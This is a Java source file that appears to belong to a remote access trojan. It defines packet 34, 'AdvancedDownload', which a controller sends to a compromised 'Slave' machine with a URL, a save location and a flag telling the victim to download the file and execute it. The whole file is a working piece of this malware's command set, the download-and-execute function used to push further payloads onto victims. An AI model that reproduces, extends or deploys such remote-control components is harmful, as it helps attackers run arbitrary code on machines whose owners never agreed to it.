package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet34AdvancedDownload extends AbstractOutgoingPacket {
	
	private String url;
	private boolean execute;
	private String location;

	public Packet34AdvancedDownload(String url, boolean execute, String location) {
		this.url = url;
		this.execute = execute;
		this.location = location;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(url);
		dos.writeBoolean(execute);
		slave.writeLine(location);
	}

	@Override
	public byte getPacketId() {
		return 34;
	}

}
